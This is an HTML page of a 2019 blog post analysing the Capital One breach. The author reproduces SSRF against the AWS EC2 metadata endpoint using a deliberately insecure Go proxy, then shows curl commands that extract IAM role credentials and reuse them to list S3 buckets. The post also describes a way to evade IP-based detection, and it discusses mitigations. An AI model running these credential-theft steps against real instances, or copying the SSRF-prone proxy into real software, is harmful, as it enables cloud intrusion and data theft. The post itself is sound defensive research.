@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <title>Metadata abuse in AWS | Gonzalo&#39;s thoughts</title>
+
+  <meta charset="UTF-8">
+  <meta name="language" content="en">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Metadata abuse in AWS" />
+  <meta name="twitter:description" content=""/>
+  <meta name="twitter:site" content="@gonfva" />
+  <meta name="twitter:creator" content="https://twitter.com/gonfva" />
+  
+
+  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
+
+
+  
+  
+    
+ 
+  
+  
+  
+  
+  
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/post.min.b60e0932fe1c50c3d7c5b4f83ee9e4592363654d0f2abf05bbd0678d5b8a214c.css" integrity="sha256-tg4JMv4cUMPXxbT4PunkWSNjZU0PKr8Fu9BnjVuKIUw="/>
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/custom.min.b9d61079591e35514609aa1d298a301372d164e46f282354e867e78611a417ce.css" integrity="sha256-udYQeVkeNVFGCaodKYowE3LRZORvKCNU6GfnhhGkF84="/>
+  
+  
+   
+   
+    
+
+<script type="application/ld+json">
+  
+    {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/gonzalo.f-v.es\/"
+      },
+      "articleSection" : "blog",
+      "name" : "Metadata abuse in AWS",
+      "headline" : "Metadata abuse in AWS",
+      "description" : "",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2019",
+      "datePublished": "2019-09-03 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2019-09-03 00:00:00 \u002b0000 UTC",
+      "url" : "http:\/\/gonzalo.f-v.es\/blog\/2019-09-03-metadata-abuse-in-aws\/",
+      "wordCount" : "1911",
+      "keywords" : ["Blog"]
+    }
+  
+  </script>
+</head>
+
+<body>
+  <div class="burger__container">
+  <div class="burger" aria-controls="navigation" aria-label="Menu">
+    <div class="burger__meat burger__meat--1"></div>
+    <div class="burger__meat burger__meat--2"></div>
+    <div class="burger__meat burger__meat--3"></div>
+  </div>
+</div>
+ 
+
+  <nav class="nav" id="navigation">
+  <ul class="nav__list">
+    
+    
+      <li>
+        <a  href="/">About</a>
+      </li>
+    
+      <li>
+        <a  href="/blog">Blog EN</a>
+      </li>
+    
+      <li>
+        <a  href="/es/blog">Blog ES</a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <main>
+    
+    
+
+    <div class="flex-wrapper">
+      <div class="post__container">
+        <div class="post">
+          <header class="post__header">
+            <h1 id="post__title">Metadata abuse in AWS</h1>
+            <time datetime="2019-09-03 00:00:00 &#43;0000 UTC" class="post__date">2019-09-03</time> 
+          </header>
+          <article class="post__content">
+              
+<h2 id="introduction">Introduction<a class="anchor" href="#introduction">#</a></h2>
+<p>A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the <a href="https://www.capitalone.com/facts2019/" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>compromise of personal information</a>
+ on around 100M people.</p>
+<p><img src="/img/1*TbzHUQSGDSFAZe-olzUgBQ.png" alt="email from AWS warning against S3 buckets with public access">AWS is putting great effort in avoiding S3 buckets configured for public accessWhen I read the initial reports, I thought the root cause was the usual “<a href="https://medium.com/@bhaveshthakur2015/how-i-was-able-to-exploit-misconfigured-aws-s3-bucket-on-a-production-server-of-oneplus-a9470ee02c68" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>S3 bucket with public permissions</a>
+” (S3 is a distributed object storage in AWS). It’s not uncommon that companies that are not very fluent with AWS permissions, end up making public a whole S3 bucket.</p>
+<p>It turns out that the attack was more sophisticated (<a href="https://www.linkedin.com/posts/gonzalofernandezvictorio_you-may-have-heard-about-the-capital-one-activity-6562006675115556864-45dJ" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>but not as much as I’d thought</a>
+).</p>
+<p>It used a technique called Server Side Request Forgery (make requests from a compromised server) and AWS credentials compromise (use AWS credentials from the compromised server).</p>
+<p>However, once you start thinking about it, this attack is eye-opening.</p>
+<h2 id="credentials-compromise">Credentials compromise<a class="anchor" href="#credentials-compromise">#</a></h2>
+<p>The details published on the <a href="https://www.justice.gov/usao-wdwa/press-release/file/1188626/download" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>indictment</a>
+ of the accused individual are a bit generic, but <a href="https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>some researchers have been digging around</a>
+ and we have a better picture of what happened.</p>
+<p>It seems that the attacker managed to trick an incorrectly configured module in a <a href="https://en.wikipedia.org/wiki/ModSecurity" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>firewall</a>
+ to make the firewall access what is known as “the metadata endpoint”. From the metadata endpoint, the attacker got the credentials associated with the EC2 instance (the virtual server that was running the firewall).</p>
+<p>It seems those credentials allowed to access a few S3 buckets. Using those credentials, the attacker connected to AWS S3 API endpoints directly and downloaded the information from those buckets without any further use of the firewall instance.</p>
+<h3 id="metadata-endpoints">Metadata endpoints<a class="anchor" href="#metadata-endpoints">#</a></h3>
+<p>There are obvious issues in how Capital One configured its infrastructure.</p>
+<ul>
+<li>First, there is an issue in the configuration of the firewall module that allowed the compromise of that server.</li>
+<li>Second, the permissions given to an instance running a firewall were too wide. It doesn’t help that it’s not simple to correctly assign permissions in AWS. But it contradicts what’s called “least privilege principle”.
+Those issues <strong>are not trivial</strong> to deal with, but they are not uncommon to the on-premises world.</li>
+</ul>
+<p>However, in this attack there is something that is very cloud specific and it is the access to the <strong>metadata endpoint</strong> to get the credentials.</p>
+<p>The <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>metadata endpoint</a>
+ is sort of a web server accessible only to the instance. Effectively appears as an IP address (http://169.254.169.254 in a <a href="https://tools.ietf.org/html/rfc3927" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>link-local</a>
+ range) it can be accessed from its own instance running on AWS (similarly to other cloud providers), and it contains some values that are exclusive to that instance.</p>
+<p>From the metadata endpoint the instance can have access to some configuration values. For example, to get the IP address of the instance,</p>
+<p>aws $ curl http://169.254.169.254/latest/meta-data/local-ipv410.70.120.226Having the configuration as something external to the instance, allows to bootstrap the instance using a single “template” (virtual machine image) together with some configuration.</p>
+<h3 id="metadata-endpoints-and-credentials">Metadata endpoints and credentials<a class="anchor" href="#metadata-endpoints-and-credentials">#</a></h3>
+<p>The metadata endpoint also may contain the credentials associated with the instance.</p>
+<p>aws $ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/){
+&ldquo;Code&rdquo; : &ldquo;Success&rdquo;,
+&ldquo;LastUpdated&rdquo; : &ldquo;2019-08-15T18:20:44Z&rdquo;,
+&ldquo;Type&rdquo; : &ldquo;AWS-HMAC&rdquo;,
+&ldquo;AccessKeyId&rdquo; : &ldquo;[redacted]&rdquo;,
+&ldquo;SecretAccessKey&rdquo; : &ldquo;[redacted]&rdquo;,
+&ldquo;Token&rdquo; : &ldquo;[redacted]&rdquo;,
+&ldquo;Expiration&rdquo; : &ldquo;2019-08-16T00:21:38Z&rdquo;
+}</p>
+<blockquote>
+<p>Why have the credentials on the metadata endpoint?Imagine we want an instance to read from an S3 bucket. Reading from an S3 bucket would need some credentials to protect confidentiality. But <strong>we don’t want</strong> to store those credentials on disk in the instance. In fact we don’t even want to have static credentials. We want to be able to change the credentials frequently (what is called “credentials rotation”)</p>
+</blockquote>
+<p>To avoid that, when preparing the instance to launch, the user can create a definition of what the instance will be able to do (in AWS terminology, an IAM role). And when the instance starts, the cloud translates those permissions into a fictitious set of credentials and lets the instance access those credentials using the metadata endpoint.</p>
+<p>To access the metadata endpoint, the instance doesn’t need credentials. But in theory, the metadata endpoint can only be accessed from the actual instance. So it should be safe. 😈</p>
+<h3 id="credentials-compromise-using-ssrf">Credentials compromise using SSRF<a class="anchor" href="#credentials-compromise-using-ssrf">#</a></h3>
+<p>As I just mentioned, the metadata endpoint is in a link-local address, which means it can only be accessed from the actual instance.</p>
+<p>Obviously, if you manage to get a shell in the machine, you’re effectively “the instance”.</p>
+<p>More importantly, you don’t need to have a shell. If you manage to convince the instance to make a request to the <strong>metadata endpoint</strong>, you’re effectively “the instance”. This is called <a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>Server Side Request Forgery</a>
+:</p>
+<blockquote>
+<p>In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a[sic] modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.#### An SSRF example</p>
+</blockquote>
+<p>I mentioned at the beginning about how in the Capital One attack there was a module misconfiguration. I don’t know the specific misconfiguration. The module seems to be <a href="https://en.wikipedia.org/wiki/ModSecurity" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>modsecurity</a>
+, but a quick look into the configuration didn’t show anything obvious.</p>
+<p>However, it is very easy to simulate the same issue with one server forwarding requests (note: <em>forwarding</em> is not the same as <em>redirecting</em>).</p>
+<p>It’s so easy that, once you understand the attack, you start checking all the places where you forward requests in your own software.</p>
+<p>Anyway, since I wanted to investigate the behaviour, I created a very crappy proxy in Golang. <strong>Please, don’t use it in production</strong> (or for anything important for that matter).</p>
+<pre><code class="language-go">package main
+// Crappy proxy. DON'T USE IT IN PRODUCTION, PLEASE, PLEASE PLEASE
+import (
+  &quot;log&quot;
+  &quot;net/http&quot;
+  &quot;net/http/httputil&quot;
+  &quot;net/url&quot;
+)
+
+func indexHandler(w http.ResponseWriter, r *http.Request) {
+  urlQueryParam := r.URL.Query().Get(&quot;url&quot;)
+  origin, \_ := url.Parse(urlQueryParam)
+  director := func(req *http.Request) {
+    req.Host = origin.Host //See &lt;https://git.io/fjNmS&gt;
+    req.URL = origin
+  }
+  proxy := &amp;httputil.ReverseProxy{Director: director}
+  proxy.ServeHTTP(w, r)
+}
+
+func main() {
+  http.HandleFunc(&quot;/&quot;, indexHandler)
+  log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))
+}
+</code></pre>
+<p>Once I developed the code, I launched an Amazon Instance (<em>t2.nano</em> will do), with the default AWS Linux Image, and associated a security group with ports 22 and 80 open (but only for my IP). I created an IAM role (assigning “s3 readonly” permissions, enough for a test) and assigned the role to the instance.</p>
+<p>Once the instance was up and running, I followed the usual steps to connect the instance…</p>
+<pre><code class="language-bash">local $ eval `ssh-agent -s`
+local $ ssh-add ~/key_i_just_created_with_the_instance.pem
+local $ ssh ec2-user@&lt;public ip of the instance&gt;…
+</code></pre>
+<p>followed by the typical steps for installing golang …</p>
+<pre><code class="language-bash">aws $ sudo yum update
+aws $ sudo yum install -y golangand then I launched the forwarding proxy:
+
+aws $ go build ./forward.go
+aws $ sudo ./forward
+</code></pre>
+<p>I had a crappy proxy listening on port 80, ready to forward any request that it receives in the <em>url</em> parameter.The proxy is purposely dumb (it’s a simple example of SSRF). But being so simple, it’s obvious that it also forwards any requests to the metadata endpoint.</p>
+<p>And for all intents and purposes, the request seems to be made from the actual instance. So I can get the credentials under which the EC2 instance is running:</p>
+<pre><code>local $ curl &lt;aws-ip&gt;/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;name of the role&gt;
+{
+  &quot;Code&quot; : &quot;Success&quot;,
+  &quot;LastUpdated&quot; : &quot;2019-08-18T19:40:03Z&quot;,
+  &quot;Type&quot; : &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot; : &quot;&lt;REDACTED&gt;&quot;,
+  &quot;SecretAccessKey&quot; : &quot;&lt;REDACTED&gt;&quot;,
+  &quot;Token&quot; : &quot;&lt;REDACTED&gt;&quot;,
+  &quot;Expiration&quot; : &quot;2019-08-19T02:10:29Z&quot;
+}
+</code></pre>
+<p>I don’t know what was the specific compromise in Capital One’s case.</p>
+<p>But <strong>SSRF can be really nasty in a cloud environment</strong>.</p>
+<h2 id="using-compromised-credentials">Using compromised credentials<a class="anchor" href="#using-compromised-credentials">#</a></h2>
+<p>Obviously, once you have those credentials, you can use them from anywhere in the world.</p>
+<p>In the following listing, from a local machine exploiting SSRF, first we get the credentials and then those credentials are used to get the number of S3 buckets.</p>
+<pre><code class="language-bash">local $ curl -s &lt;aws-machine-ip&gt;/?url=&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/gonzalo-metadata&gt; &gt; /tmp/aws_cred.json
+local $ export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/aws\_cred.json)
+local $ export AWS\_SECRET\_ACCESS\_KEY=$(jq -r '.SecretAccessKey' /tmp/aws_cred.json)
+local $ export AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/aws_cred.json)
+local $ aws s3 ls|wc -l
+8
+</code></pre>
+<p>Let’s reiterate this again.</p>
+<p>Once you’ve got the credentials, you can use them to access any AWS services that the instance is allowed to access.#### Mitigations</p>
+<p>Last year people in Netflix where already aware of this problem and wrote a couple of super interesting articles on <a href="https://medium.com/netflix-techblog/netflix-cloud-security-detecting-credential-compromise-in-aws-9493d6fd373a" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>detection</a>
+ and <a href="https://medium.com/netflix-techblog/netflix-information-security-preventing-credential-compromise-in-aws-41b112c15179" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>prevention</a>
+ for this type of attacks.</p>
+<p>You should read both articles, because they explain the problem and solutions better than me. In any case, my layman summary would be:</p>
+<ul>
+<li>For <strong>detection</strong>, you can parse CloudTrail (AWS CloudTrail is a service that logs every call to AWS). Simplifying, you would check and record the IP from where the instance makes an API call for the first time. If later on, that instance makes another call from a different IP, it is most likely an attacker using the credentials he/she has already obtained.</li>
+<li>For <strong>prevention</strong>, instances wouldn’t have direct access to the metadata endpoint. They would have access to a proxy that would check if the call has a specific header attached. Attaching a header to the proxy would be more difficult than making a simple request.</li>
+</ul>
+<h2 id="rest-api-exploitation">REST API exploitation<a class="anchor" href="#rest-api-exploitation">#</a></h2>
+<p>Netflix’s <strong>detection</strong> technique assumes that once the credentials are compromised, the attacker no longer uses the EC2 instance to access AWS services. And with that assumption, detects the compromise in a change of IP address.</p>
+<p><img src="/img/1*VQB6XiMQRlENB2a59jeZ2g.jpeg" alt="Wolf in sheep’s clothing"><em>Wolf in sheep’s clothing (by <a href="https://www.flickr.com/photos/drewtarvin/24107843813" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>Drew Travin</a>
+)</em></p>
+<p>But that is not a correct assumption. Because <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/RESTServiceGET.html" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>some</a>
+ of the AWS services can be accessed via GET using a REST API (and a specific <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>signing process</a>
+). And if the attacker managed to invoke the metadata endpoint, it may be able to invoke the REST API, especially considering that REST APIs can receive all the parameters via query string.</p>
+<p>I’m not going to detail the steps (sorry, no public code), but I can confirm that the following works:</p>
+<ul>
+<li>Use SSRF to get the credentials (as we saw it before).</li>
+<li>Build the request and sign it. In <a href="https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html#sig-v4-examples-get-query-string" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>this example</a>
+ you can see how to do it, although it will need some modifications because that script doesn’t manage session tokens. The documentation is not quite correct (<em>COUGH</em>payload_hash<em>COUGH</em>).</li>
+<li>Use SSRF again to send the request using the URL for the signed request. In the below example, the invocation uses only a GET request with query string parameters (no need to send headers). The end result is a list of buckets that the instance can access. Using SSRF we have accessed AWS APIs.</li>
+</ul>
+<pre><code class="language-bash">  local $ eval `python3 creds.py`
+  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+  &lt;ListAllMyBucketsResult xmlns=&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;&gt;&lt;Owner&gt;&lt;ID&gt;[REDACTED]&lt;/ID&gt;&lt;DisplayName&gt;[REDACTED]&lt;/DisplayName&gt;&lt;/Owner&gt;&lt;Buckets&gt;&lt;Bucket&gt;&lt;Name&gt;[REDACTED]&lt;/Name&gt;&lt;CreationDate&gt;2019-07-09T19:01:03.000Z&lt;/CreationDate&gt;&lt;/Bucket&gt;[...]&lt;/Buckets&gt;&lt;/ListAllMyBucketsResult&gt;
+</code></pre>
+<p>I want to stress that since we’re using SSRF, the request comes from the instance.</p>
+<p><img src="/img/1*U8CWJ354T_MiGu0eCZKPEg.png" alt="AWS Cloudtrail record of the API access where the source IP is the instance IP"><em>CloudTrail entry for the “attack”. Source IP is the actual instance IPSo, limiting the source IP has no impact.</em></p>
+<p>Netflix proposal for a detection system may not work.</p>
+<h2 id="conclusions">Conclusions<a class="anchor" href="#conclusions">#</a></h2>
+<p>Netflix’s technique to detect credentials abuse is not always valid. When coupling SSRF with metadata endpoint abuse, it can be avoided by using REST API exploitation.</p>
+<p>The main remaining mitigation would be to apply the least privilege principle and reduce the permissions assigned to the instances. However, as I mentioned on a previous article, <a href="https://medium.com/@gonfva/configuration-in-aws-is-difficult-6e9474ce560b" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>the implications of assigning a specific permission are not always fully understood</a>
+.</p>
+<p>SSRF can be catastrophic in a cloud environment. Misconfiguration in the permissions coupled to SSRF is <strong>game over.</strong></p>
+<p>This article expresses my research and views and it doesn’t necessarily express those of my employer(s).</p>
+
+
+              
+          </article>
+          
+
+ <div class="pagination">
+  
+    <a class="pagination__item" href="http://gonzalo.f-v.es/blog/2019-09-02-configuration-in-aws-is-difficult/">
+        <span class="pagination__label">Previous Post</span>
+        <span class="pagination__title">Configuration in AWS is difficult</span>
+    </a>
+  
+
+  
+    <a class="pagination__item" href="http://gonzalo.f-v.es/blog/2019-10-16-dock-disappeared-in-macos-catalina/">
+      <span class="pagination__label">Next Post</span>
+      <span class="pagination__title" >Dock disappeared in MacOS Catalina</span>
+    </a>
+  
+</div>
+
+          
+          <footer class="post__footer">
+            
+
+
+<div class="social-icons">
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="Twitter"
+         href="https://twitter.com/gonfva"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('http://gonzalo.f-v.es/svg/twitter.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="GitHub"
+         href="https://github.com/gonfva"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('http://gonzalo.f-v.es/svg/github.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="LinkedIn"
+         href="https://www.linkedin.com/in/gonzalofernandezvictorio/"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('http://gonzalo.f-v.es/svg/linkedin.svg')"></div>
+      </a>
+    
+     
+</div>
+
+            <p>© Gonzalo Fernandez-Victorio 2021</p>
+          </footer>
+          </div>
+      </div>
+      
+      <div class="toc-container">
+           <div class="toc-post-title">Metadata abuse in AWS</div> 
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#credentials-compromise">Credentials compromise</a>
+      <ul>
+        <li><a href="#metadata-endpoints">Metadata endpoints</a></li>
+        <li><a href="#metadata-endpoints-and-credentials">Metadata endpoints and credentials</a></li>
+        <li><a href="#credentials-compromise-using-ssrf">Credentials compromise using SSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#using-compromised-credentials">Using compromised credentials</a></li>
+    <li><a href="#rest-api-exploitation">REST API exploitation</a></li>
+    <li><a href="#conclusions">Conclusions</a></li>
+  </ul>
+</nav>
+      </div>
+      
+    </div>
+    
+
+  </main>
+
+   
+
+  
+  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>
+
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
+    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>
+
+  
+    <script src="/js/table-of-contents.js"></script>
+  
+
+
+</body>
+
+</html>
